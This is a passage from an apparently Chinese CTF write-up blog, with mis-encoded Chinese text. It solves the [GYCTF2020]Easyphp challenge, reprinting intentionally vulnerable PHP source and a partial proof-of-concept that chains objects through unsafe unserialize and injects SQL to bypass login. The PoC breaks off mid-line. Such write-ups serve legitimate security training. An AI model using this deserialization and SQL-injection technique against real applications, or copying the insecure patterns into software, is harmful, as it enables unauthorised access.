class="string">f&quot;[+]Final Result is: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{a0fc974d-cfb0-4811-a9ba-f294d06a2008}</p></blockquote><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><h3 id="www-zipæ–‡ä»¶æ³„éœ²-phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#www-zipæ–‡ä»¶æ³„éœ²-phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="www.zipæ–‡ä»¶æ³„éœ² + phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>www.zipæ–‡ä»¶æ³„éœ² + phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h3><p>www.zipæ³„éœ²å‡ºæºç ï¼Œå¯åˆ©ç”¨çš„æœ‰update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$users</span>-&gt;update();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å’Œlib.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    str_replace(<span class="variable">$array</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$parm</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$mysqli</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$mysqli</span>-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;id) &#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ çš„IDæ˜¯&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ å¥½ï¼&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$Info</span> = unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span> = <span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>], <span class="variable">$Info</span>, <span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>, <span class="variable">$nickname</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//å±</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>, <span class="variable">$nickname</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$argument</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>, <span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span> = unserialize(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;mysqli-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_result(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;fetch();</span><br><span class="line">        <span class="variable">$result</span>-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password) !== <span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶è¿™æœ‰ä¸ª<code>file_get_contents()</code>ï¼Œä½†æ˜¯ç”±äºflagè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸å¯ç”¨ã€‚</p><p>ç„¶åçœ‹åˆ°update()æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$Info</span> = unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span> = <span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>], <span class="variable">$Info</span>, <span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œæœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„å…¥å£ï¼Œç®€å•å®¡è®¡å¯ä»¥å¾ˆå®¹æ˜“æ„é€ å‡ºpopé“¾ã€‚</p><p>ä½†æ˜¯ç”±äºæ— æ³•è·å–æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬è·å–flagçš„æ–¹å¼åªæœ‰ä½¿session[â€˜loginâ€™] = 1ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$mysqli</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$mysqli</span>-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;id) &#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ çš„IDæ˜¯&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ å¥½ï¼&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¾¾åˆ°ç›®çš„æœ‰ä¸¤ç§æ–¹å¼ï¼Œéƒ½æ˜¯åˆ©ç”¨dbCtrlç±»çš„loginæ–¹æ³•ã€‚</p><p>ä¸€æ˜¯ä½¿$this-&gt;token == adminã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805150616717.png"></p><p>äºŒæ˜¯è¾“å…¥æ­£ç¡®çš„å¯†ç ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805150639158.png"></p><p>ç”±äºsqlè¯­å¥å¯æ§ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ç¬¬äºŒç§æ–¹æ³•ã€‚</p><p>sqlè¯­å¥æ”¹ä¸º<code>select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></p><p>1çš„md5å€¼ä¸º<code>c4ca4238a0b923820dcc509a6f75849b</code>é€šè¿‡è¿™ä¸ªè¯­å¥è¾“å‡ºçš„ç»“æœä¼šè¿”å›1ï¼Œåˆ™æˆ‘ä»¬åªéœ€è¦æ§åˆ¶$this-&gt;passwordçš„å€¼å³å¯ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805151121757.png"></p><p>è¿™é‡Œç›´æ¥ç»™poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="string">&quot;2&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span 